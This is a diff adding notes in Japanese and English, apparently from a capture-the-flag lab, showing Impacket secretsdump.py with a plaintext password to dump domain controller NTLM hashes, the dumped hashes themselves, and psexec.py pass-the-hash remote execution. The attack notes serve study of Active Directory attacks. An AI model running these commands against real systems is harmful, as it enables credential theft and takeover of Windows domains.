@@ -1946,8 +1946,36 @@ python3 /home/kali/.local/bin/GetNPUsers.py -dc-ip 10.10.176.6 spookysec.local/ 
 
 ```
 
+### secretsdump.py
+
+remote machine から秘匿情報をdumpする。
+
+we dump NTLM hashes, Plaintext credentials (if available) and Kerberos keys
+
+```
+
+secretsdump.py spooky.sec.local/backup:'backup2517860'@10.10.108.200 -just-dc 
+
+-just-dc: Extract only NTDS.DIT data (NTLM hashes and Kerberos keys)
+
+結果:
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
+...
+
+```
 
 
+### psexec.py
+
+secretsdump.pyで得られたhashを用いて、remote execution を行う
+
+```
+
+psexec.py Administrator@10.10.108.200 -hashes aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc
+
+```
 
 
 # Windowsコマンド
